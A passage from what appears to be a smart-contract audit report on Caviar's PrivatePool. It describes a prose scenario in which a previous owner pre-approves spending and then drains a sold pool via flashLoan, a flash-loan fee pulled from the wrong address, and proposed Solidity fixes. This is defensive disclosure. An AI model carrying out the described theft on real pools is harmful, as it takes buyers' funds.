href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/939\">ulqiorra</a> and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/295\">ladboy233</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L461\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L461</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654</a></p>\n<p><code>PrivatePool.sol</code> ERC721 and ERC20 tokens can be stolen by the previous owner via <code>execute</code> and <code>flashLoan</code> functions (or by malicious approval by the current owner via <code>execute</code>)</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s say that Bob is the attacker and Alice is a regular user.</p>\n<ol>\n<li>Bob creates a <code>PrivatePool.sol</code> where he deposits 5 ERC721 tokens and 500 USDC.</li>\n<li>Then Bob creates a malicious contract (let’s call it <code>PrivatePoolExploit.sol</code>) and this contract contains <code>onFlashLoan</code> (IERC3156FlashBorrower), <code>transferFrom</code> , <code>ownerOf</code>, <code>onERC721Received</code> functions (like ERC721 does) and an additional <code>attack</code> function.</li>\n<li>Via <code>PrivatePool.execute</code> function Bob approves USDC spending (<code>type(uint).max</code>) and <code>setApprovalForAll</code> for ERC721 tokens</li>\n<li>Since the ownership of <code>PrivatePool</code> is stored in <code>Factory.sol</code> as an ERC721 token, ownership can be sold on any ERC721 marketplace. Alice decides to buy Bob’s <code>PrivatePool</code> and ownership is transferred to Alice.</li>\n<li>Right after the ownership is transferred, Bob runs <code>PrivatePoolExploit.attack</code> function, which calls <code>PrivatePool.flashLoan</code> where <code>PrivatePoolExploit.transferFrom</code> will be called since the flash loan can be called on any address.</li>\n<li>All the funds are stolen by Bob and Alice’s <code>PrivatePool</code> is left with nothing.</li>\n</ol>\n<p>See warden’s <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/230\">original submission</a> for full POC.</p>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry/VSCode</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The contract caller should not be able to choose the token address in the <code>PrivatePool.flashLoan</code> function because there is no way to know if the token contract is actually an ERC721 contract.</p>\n<p>Suggest removing <code>token</code> from function input parameters and using <code>nft</code> token everywhere, where <code>token</code> was used.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC3156FlashBorrower</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the NFT is available for a flash loan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">availableForFlashLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAvailableForFlashLoan</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">flashFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if base token is ETH then check that caller sent enough for the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the NFT to the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// call the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that flashloan was successful</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashLoanFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the NFT from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the fee from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/230#issuecomment-1518697291\">outdoteth (Caviar) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I think a potential fix is to prevent execute() from being able to call the baseToken the nft that is associated with the contract, which would stop the malicious approvals.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/230#issuecomment-1520570998\">outdoteth (Caviar) mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/2\">https://github.com/outdoteth/caviar-private-pools/pull/2</a></p>\n<p>Proposed fix is to add a check in the execute() function that will revert if the target contract is the baseToken or nft.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">target</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">target</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidTarget</span><span class=\"mtk1\">();</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/230#issuecomment-1529072199\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to composability, it’s possible for the previous owner to set the PrivatePool to grant approvals for all it’s tokens, in a way that will allow the previous owner to steal them back.</p>\n<p>There are many considerations to this:</p>\n<ul>\n<li>Would a reasonable buyer check for previous approvals?</li>\n<li>Would a more reasonable approach be to buy the NFTs and create their own Pool?</li>\n</ul>\n<p>Nonetheless the Approval Farming can be performed and the attack can be done in that way, however the buyer would have to buy a Pool for which the approvals have been setup and they would have to do so without revoking them (they could buy and revoke in the same tx).</p>\n<p>Because of this, I belive that the finding is valid but of Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-16-privatepoolflashloan-takes-fee-from-the-wrong-address\" style=\"position:relative;\"><a href=\"#m-16-privatepoolflashloan-takes-fee-from-the-wrong-address\" aria-label=\"m 16 privatepoolflashloan takes fee from the wrong address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/56\">[M-16] <code>PrivatePool.flashLoan()</code> takes fee from the wrong address</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/56\">Ruhum</a></em></p>\n<p>Instead of taking the fee from the receiver of the flashloan callback, it pulls it from <code>msg.sender</code>.</p>\n<p>As specified in <a href=\"https://eips.ethereum.org/EIPS/eip-3156#lender-specification\">EIP-3156</a>:</p>\n<blockquote>\n<p>“After the callback, the flashLoan function MUST take the amount + fee token from the receiver, or revert if this is not successful.”</p>\n</blockquote>\n<p>This will be an unexpected loss of funds for the caller if they have the pool pre-approved to spend funds (e.g. they previously bought NFTs) and are not the owner of the flashloan contract they use for the callback.</p>\n<p>Additionally, for ETH pools, it expects the caller to pay the fee upfront. But, the fee is generally paid with the profits made using the flashloaned tokens.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If <code>baseToken</code> is ETH, it expects the fee to already be sent with the call to <code>flashLoan()</code>. If it’s an ERC20 token, it will pull it from <code>msg.sender</code> instead of <code>receiver</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC3156FlashBorrower</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">flashFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if base token is ETH then check that caller sent enough for the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the fee from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ... </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/56#issuecomment-1520498279\">outdoteth (Caviar) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/56#issuecomment-1528965969\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I have considered downgrading to QA for the ETH aspect as technically there is no EIP for ETH flashloans (FL EIP is only for ERC20s).</p>\n<p>That said, the way payment is pulled in ERC20s is breaking the spec, and for this reason am awarding Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-the-tokenuri-method-does-not-check-if-the-nft-has-been-minted-and-returns-data-for-the-contract-that-may-be-a-fake-nft\" style=\"position:relative;\"><a href=\"#m-17-the-tokenuri-method-does-not-check-if-the-nft-has-been-minted-and-returns-data-for-the-contract-that-may-be-a-fake-nft\" aria-label=\"m 17 the tokenuri method does not check if the nft has been minted and returns data for the contract that may be a fake nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44\">[M-17] The <code>tokenURI</code> method does not check if the NFT has been minted and returns data for the contract that may be a fake NFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44\">Haipls</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/979\">Rolezn</a> and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/977\">0xSmartContract</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161</a></p>\n<p><a 